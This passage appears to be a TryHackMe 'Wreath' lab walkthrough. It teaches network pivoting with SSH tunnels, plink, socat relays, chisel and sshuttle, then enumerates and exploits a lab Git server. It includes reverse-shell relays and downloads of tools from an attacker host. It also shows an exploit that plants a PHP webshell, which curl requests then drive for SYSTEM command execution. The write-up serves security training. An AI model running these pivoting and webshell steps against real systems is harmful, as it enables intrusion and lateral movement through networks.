   We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine. For example, by entering localhost:8000 into a      web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use    a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to        serve an exploit to a target), and also means that we do not need to use sudo to create the connection. The -fN combined switch does two things: -f backgrounds the shell        immediately so that we have our own terminal back. -N tells SSH that it doesn't need to execute any commands -- only set up the connection.

   Proxies are made using the -D switch, for example: -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This    is useful when combined with a tool such as proxychains. An example of this command would be:

      - ssh -D 1337 user@172.16.0.5 -fN

   This again uses the -fN switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set    up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.

   - Reverse Connections

   Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however,    riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse        connection safely, there are a few steps we need to take:

   1) First, generate a new set of SSH keys and store them somewhere safe (ssh-keygen):

   his will create two new files: a private key, and a public key.

   2) Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh       directory and authorized_keys file first.

   3) On a new line, type the following line, then paste in the public key:
         
          - command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
   
   This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
   
   The final entry in the authorized_keys file should look something like this:

   ![image](https://user-images.githubusercontent.com/68686150/114845009-fd2d8080-9df8-11eb-9be5-8c97f9b30846.png)
  
   Next. check if the SSH server on your attacking machine is running:

    - sudo systemctl status ssh

   If the service is running then you should get a response that looks like this (with "active" shown in the message):

   If the status command indicates that the server is not running then you can start the ssh service with:

     - sudo systemctl start ssh

   The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH    keys to be discarded as soon as the engagement is over.

   With the key transferred, we can then connect back with a reverse port forward using the following command:

    - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

   To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to      the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:

    - ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN

   This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!

   In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older        clients, but this command can be used to create a reverse proxy in clients which do support it:

     - ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN

   This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

   Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH          server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for      older systems.

   To close any of these connections, type  ![image](https://user-images.githubusercontent.com/68686150/114845647-8fce1f80-9df9-11eb-9704-45ddebb823e2.png)
   into the terminal of the machine that created the connection:

   ![image](https://user-images.githubusercontent.com/68686150/114845755-a5434980-9df9-11eb-8473-6cc3a9dbb179.png)


***[Task 12]: Pivoting plink.exe***

   Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however,    it is still a very useful tool, so we will cover it here.

   Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it    to create a reverse connection. This would be done with the following command:

     - cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

   Notice that this syntax is nearly identical to previously when using the standard OpenSSH client. The cmd.exe /c echo y at the start is for non-interactive shells (like most    reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.

   To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine              (172.16.0.20), we could use this command:

     - cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N

   Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using 
      
     - sudo apt install putty-tools. 
  
   After downloading the tool, conversion can be done with:

     - puttygen KEYFILE -o OUTPUT_KEY.ppk

   Substituting in a valid file for the keyfile, and adding in the output file.

   The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task            (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).

   Note: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst      there is a copy pre-installed on Kali at /usr/share/windows-resources/binaries/plink.exe, downloading a new copy from here before a new engagement is sensible.

   ![image](https://user-images.githubusercontent.com/68686150/114981530-c8c6cc80-9eab-11eb-9eb2-d0857d9cf05b.png)


***[Task 13]: Pivoting Socat***

   Socat is not just great for fully stable Linux shells[1], it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people      have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both Linux and Windows. Bear in mind      that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have            completed the What the Shell? room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption        options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however,    it's  well worth experimenting with this in your own time.

   Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both        Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a          direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the      target and then forwards it immediately back to the attacking box:


   ![image](https://user-images.githubusercontent.com/68686150/114981801-2ce99080-9eac-11eb-9512-b240b5292ee5.png)

   It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This    could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the        listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.

   Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above        example we're creating a port forward from a port on the compromised server to a listening port on our own box. We could do this the other way though, by either forwarding a    connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the attacking machine with the service on the        internal server. This latter application is especially useful as it does not require opening a port on the compromised server.

   Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.

   For example, with a Python webserver:-

   On Kali (inside the directory containing your Socat binary):

     - sudo python3 -m http.server 80

   Then, on the target:

     - curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME

   With the binary uploaded, let's have a look at each of the above scenarios in turn.

   Note: This uploads the socat binary with your username in the title; however, the example commands given in the rest of this task will refer to the binary simply as socat.

   Reverse Shell Relay:

   In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a            standard netcat listener on our attacking box (sudo nc -lvnp 443). Next, on the compromised server, use the following command to start the relay:
   ./socat tcp-l:8000 tcp:ATTACKING_IP:443 &

   Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.

   From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the      remote server to simulate receiving a reverse shell from the target server:

   A brief explanation of the above command:

   - tcp-l:8000 is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
    
   - tcp:ATTACKING_IP:443 connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
    & backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.
    
   - The relay connects back to a listener started using an alias to a standard netcat listener: sudo nc -lvnp 443.
  
   In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily;        however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.

   Port Forwarding -- Easy:

   The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the      target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server)    to create a port forward:

     - ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

   This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to    the (presumably MySQL Database) running on our target of 172.16.0.10. The fork option is used to put every connection into a new process, and the reuseaddr option means that    the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use & to background the    shell, allowing us to keep using the same terminal session on the compromised server for other things.

   We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.


   Port Forwarding -- Quiet:

   The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning.      Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening      up a port externally on the compromised server.

   First of all, on our own attacking machine, we issue the following command:
  
     - socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

   This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and      reuseaddr options set, to allow us to create more than one connection using this port forward.

   Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:

     - ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &

   This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could      enter this command as:

     - ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

   This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our          attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

   This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:


   The request goes to 127.0.0.1:8000
   Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
   Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server,        where it gets relayed to port 80 on the target server.
   The process is then reversed when the target sends the response:

   The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on      our attacking machine.
   Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response,      thus the page is received and rendered.
   We have now achieved the same thing as previously, but without opening any ports on the server!

   Finally, we've learnt how to create backgrounded socat port forwards and relays, but it's important to also know how to close these. The solution is simple: run the jobs        command in your terminal, then kill any socat processes using kill %NUMBER:


   ![image](https://user-images.githubusercontent.com/68686150/114982981-b3eb3880-9ead-11eb-9b77-a74aafccd7c7.png)


***[Task 14]: Pivoting Chisel***

   Chisel is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH      access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided). In many ways it provides the      same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn't require SSH access on the compromised target is a big          bonus.

   Before we can use chisel, we need to download appropriate binaries from the tool's Github release page. These can then be unzipped using gunzip, and executed as normal:

   You must have an appropriate copy of the chisel binary on both the attacking machine and the compromised server. Copy the file to the remote server with your choice of file      transfer method. You could use the webserver method covered in the previous tasks, or to shake things up a bit, you could use SCP:

     - scp -i KEY chisel user@target:/tmp/chisel-USERNAME


   The chisel binary has two modes: client and server. You can access the help menus for either with the command: chisel client|server --help

   We will be looking at two uses for chisel in this task (a SOCKS proxy, and port forwarding); however, chisel is a very versatile tool which can be used in many ways not          described here. You are encouraged to read through the help pages for the tool for this reason.


   Reverse SOCKS Proxy:
   Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects back from a compromised server to a listener waiting on our attacking machine.

   On our own attacking box we would use a command that looks something like this:

      ./chisel server -p LISTEN_PORT --reverse &

   This sets up a listener on your chosen LISTEN_PORT.

   On the compromised host, we would use the following command:

      ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &

   This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (&) to background the processes.

   Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on 127.0.0.1:1080. As such, we will be using port 1080 when sending data        through the proxy.

   Note the use of R:socks in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when        connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made      at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the        chisel help pages for more information is recommended.


   Forward SOCKS Proxy:
   
   Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound    traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it's still well worth learning how to set up a forward proxy with chisel.

   In many ways the syntax for this is simply reversed from a reverse proxy.

   First, on the compromised host we would use:

       ./chisel server -p LISTEN_PORT --socks5

   On our own attacking box we would then use:

       ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

   In this command, PROXY_PORT is the port that will be opened for the proxy.

   For example, ./chisel client 172.16.0.10:8080 1337:socks would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of      our attacking machine.

   Proxychains Reminder:

   When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change    the start of the line from socks4 to socks5:

   ![image](https://user-images.githubusercontent.com/68686150/114984262-2c9ec480-9eaf-11eb-9247-b4111476e3fc.png)

   Now that we've seen how to use chisel to create a SOCKS proxy, let's take a look at using it to create a port forward with chisel.

   Remote Port Forward:

   A remote port forward is when we connect back from a compromised target to create the forward.

   For a remote port forward, on our attacking machine we use the exact same command as before:
 
      ./chisel server -p LISTEN_PORT --reverse &

   Once again this sets up a chisel listener for the compromised host to connect back to.
   The command to connect back is slightly different this time, however:

      ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &

   You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by    colons. Note the distinction between the LISTEN_PORT and the LOCAL_PORT. Here the LISTEN_PORT is the port that we started the chisel server on, and the LOCAL_PORT is the port    we wish to open on our own attacking machine to link with the desired target port.

   To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for          forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:

       ./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &

   Connecting back to our attacking machine, functioning as a chisel server started with:

       ./chisel server -p 1337 --reverse &

   This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.

   Local Port Forward:
   As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

   On the compromised target we set up a chisel server:

       ./chisel server -p LISTEN_PORT

   We now connect to this from our attacking machine like so:

       ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

   For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could      use:

       ./chisel client 172.16.0.5:8000 2222:172.16.0.10:22

   As with the backgrounded socat processes, when we want to destroy our chisel connections we can use jobs to see a list of backgrounded jobs, then kill %NUMBER to destroy each    of the chisel processes.

   Note: When using Chisel on Windows, it's important to remember to upload it with a file extension of .exe (e.g. chisel.exe)!

   ![image](https://user-images.githubusercontent.com/68686150/114984674-9ae38700-9eaf-11eb-8e7d-78f32b8a242a.png)


***[Task 15]: Pivoting sshuttle***

   Finally, let's take a look at our last tool of this section: sshuttle.

   This tool is quite different from the others we have covered so far. It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already        seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the    proxy without the use of proxychains (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. As      it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking      machine, in much the same way we would SSH into a remote server.

   Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised    server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work    with that. These restrictions do somewhat limit the uses for sshuttle; however, when it is an option, it tends to be a superb bet!

   First of all we need to install sshuttle. On Kali this is as easy as using the apt package manager:
      
        sudo apt install sshuttle


   The base command for connecting to a server with sshuttle is as follows:
 
       sshuttle -r username@address subnet 

   For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:

      sshuttle -r user@172.16.0.5 172.16.0.0/24

   We would then be asked for the user's password, and the proxy would be established. The tool will then just sit passively in the background and forward relevant traffic into    the target network.

   Rather than specifying subnets, we could also use the -N option which attempts to determine them automatically based on the compromised server's own routing table:

      sshuttle -r username@address -N

   Bear in mind that this may not always be successful though!

   As with the previous tools, these commands could also be backgrounded by appending the ampersand (&) symbol to the end.

   If this has worked, you should see the following line:

       c : Connected to server.
 
   Well, that's great, but what happens if we don't have the user's password, or the server only accepts key-based authentication?

   Unfortunately, sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this          limitation using the --ssh-cmd switch.

   This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply ssh with no            arguments. With the --ssh-cmd switch, we can pick a different command to execute for authentication: say, ssh -i keyfile, for example!

   So, when using key-based authentication, the final command looks something like this:

      sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET

   To use our example from before, the command would be:

      sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24

   Please Note: When using sshuttle, you may encounter an error that looks like this:

     client: Connected.
     client_loop: send disconnect: Broken pipe
     client: fatal: server died with error code 255

   This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5    and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool    to die.

   To get around this, we tell sshuttle to exlude the compromised server from the subnet range using the -x switch.

   To use our earlier example:

    sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5

   This will allow sshuttle to create a connection without disrupting itself.

   ![image](https://user-images.githubusercontent.com/68686150/115668179-69adff80-a364-11eb-81ec-fef89fd5945a.png)


***[Task 16] Pivoting Conclusion***

   That was a long and theory-heavy section, so kudos for getting this far!

   The big take away from this section is: there are many different ways to pivot through a network. Further research in your own time is highly recommended, as there are a        great many interesting techniques which we haven't had time to cover here (for example, on a fully rooted target, it's possible to use the installed firewall -- e.g. iptables    or Windows Firewall -- to create entry points into an otherwise inaccessible network. Equally, it's possible to set up a route manually in the routing table of your attacking    machine to, routing your traffic into the target network without requiring a proxy-tool like Proxychains or Foxyproxy).

   As a summary of the tools in this section:

   Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
     
   -  SSH can be used to create both port forwards, and proxies
   - plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
   - Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
   - Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
   - sshuttle is a nicer way to create a proxy when we have SSH access on a target

   Pivoting truly is a vast topic; however, hopefully you've learnt something by covering the theory in this section!


***[Task 17] Git Server Enumeration***

   t's time to put your newfound knowledge to the test!

   Download a static nmap binary. Rename it to nmap-USERNAME, substituting in your own TryHackMe username. Finally, upload it to the target in a manner of your choosing.

   For example, with a Python webserver:-

   On Kali (inside the directory containing your Nmap binary):

       sudo python3 -m http.server 80

   Then, on the target:

       curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME


   ![image](https://user-images.githubusercontent.com/68686150/115669464-ea213000-a365-11eb-91a5-52ebf14458bc.png)

   Now use the binary to scan the network. The command will look something like this:

      ./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME

   You will need to substitute in your username, and the correct IP range. For example:

      ./nmap-MuirlandOracle -sn 10.200.72.1-255 -oN scan-MuirlandOracle

   Here the -sn switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.

   Note that this would also work with CIDR notation (e.g. 10.x.x.0/24).

   Use what you've learnt to answer the following questions!

   Note: The host ending in .250 is the OpenVPN server, and should be excluded from all answers. It is not part of the vulnerable network, and should not be targeted. The same    goes for the host ending in .1 (part of the AWS infrastructure used to create the network) -- this too is out of scope and should be excluded from all answers.


  ![image](https://user-images.githubusercontent.com/68686150/115669648-1fc61900-a366-11eb-9d1e-ab837438933b.png)

  ![image](https://user-images.githubusercontent.com/68686150/115669731-37050680-a366-11eb-97a8-aed4086960b2.png)


***[Task 18] Git Server Pivoting***

   Thinking about the interesting service on the next target that we discovered in the previous task, pick a pivoting technique and use it to connect to this service, using the    web browser on your attacking machine! 

   As a word of advice: sshuttle is highly recommended for creating an initial access point into the rest of the network. This is because the firewall on the CentOS target will    prove problematic with some of the techniques shown here. We will learn how to mitigate against this later in the room, although if you're comfortable opening up a port        using FirewallD then port forwarding or a proxy would also work.
   
   ![image](https://user-images.githubusercontent.com/68686150/115828022-c07e0c80-a42a-11eb-87db-ea45693d344e.png)

   ![image](https://user-images.githubusercontent.com/68686150/115670216-cb6f6900-a366-11eb-96df-aaa2d8fc8027.png)
  
   ![image](https://user-images.githubusercontent.com/68686150/115670293-e0e49300-a366-11eb-9d45-9800dd37112a.png)
 
   Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle:
   
      http://IP/ANSWER
  
   ![image](https://user-images.githubusercontent.com/68686150/115670490-18ebd600-a367-11eb-8fc9-1f6ca96969f3.png)

   When navigating to this URI, we are given the following login page:
  
   ![image](https://user-images.githubusercontent.com/68686150/115670419-05406f80-a367-11eb-9fbf-8d1f099c2730.png)

   ![image](https://user-images.githubusercontent.com/68686150/115670532-25702e80-a367-11eb-9feb-122d9830a9af.png)


***[Task 19]: Git Server Code Review***

   In the previous task we found an exploit that might work against the service running on the second server.

   Make a copy of this exploit in your local directory using the command:


       searchsploit -m EDBID
      
   Unfortunately, the local exploit copies stored by searchsploit use DOS line endings, which can cause problems in scripts when executed on Linux:

   Before we can use the exploit, we must convert these into Linux line endings using the dos2unix tool:

      dos2unix ./EDBID.py

   This  can also be done manually with sed if dos2unix is unavailable:

      sed -i 's/\r//' ./EDBID.py

   With the file converted, it's time to read through the exploit to make sure we know what it's doing. The fact that the exploit is on Exploit-DB means that it's unlikely to      be outright malicious, but there's no guarantee that it will work, or do anything close to exploiting a vulnerabilty in the service.

   Open the exploit in your favourite text editor and let's get going!

   ![image](https://user-images.githubusercontent.com/68686150/115826245-359c1280-a428-11eb-91b6-6bb3dd8e5739.png)

   ![image](https://user-images.githubusercontent.com/68686150/115826313-506e8700-a428-11eb-8fc7-e1d373475c8e.png)
 
   We are, however, interested in the last 6 lines of the exploit:
 
   ![alt text](https://assets.tryhackme.com/additional/wreath-network/0c95035c81e7.png)

   These create a PHP webshell (<?php system($_POST['a']); ?>) and echo it into a file called exploit.php under the webroot. This can then be accessed by posting a command to      the newly created /web/exploit.php file.

   For the sake of not spoiling things for other users, we are going to alter this before running the script.

   We can leave the payload as it is, but we will alter both instances of "exploit.php" in the script to be exploit-USERNAME.php, for example:

   ![alt_text](https://assets.tryhackme.com/additional/wreath-network/312cae5fdfc7.png)

   ![image](https://user-images.githubusercontent.com/68686150/115827060-6761a900-a429-11eb-93ae-27ed84e366be.png)


***[Task 20]: Git Server Exploitation***

   In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.

   But first start the proxy. We can use any proxy but as a word of advice: sshuttle is highly recommended for creating an initial access point into the rest of the network. 
 
       sshuttle -r root@10.200.90.200 --ssh-cmd "ssh -i id_rsa" 10.200.90.0/24 -x 10.200.90.200 -v

   ![image](https://user-images.githubusercontent.com/68686150/115827758-5e250c00-a42a-11eb-89cc-f1ed0a52a2c1.png)

   ![image](https://user-images.githubusercontent.com/68686150/115828142-ec00f700-a42a-11eb-9a5b-18e589480412.png)
 
   Success!

   Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.

   From here we want to obtain a full reverse shell. We have two options for this:

   - We could change the command in the exploit and re-run the code
   - We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice
   
   Option number two is a lot quieter than option number 1, so let's use that.

   The webshell we have uploaded responds to a POST request using the parameter "a" (by default). This means that we have two easy ways to access this. We could use cURL from      the command line, or BurpSuite for a GUI option.

   With cURL:
  
     curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"

   ![image](https://user-images.githubusercontent.com/68686150/115828374-439f6280-a42b-11eb-80e7-5ffe9e0021c4.png)

     Note: in this screenshot, gitserver.thm has been added to the /etc/hosts file on the attacking machine, mapped to the target IP address.

   With BurpSuite:

   We first turn on our Burp proxy (see the Burpsuite room if you need help with this!) and navigate to the exploit URL:

   [!alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_1.png)










































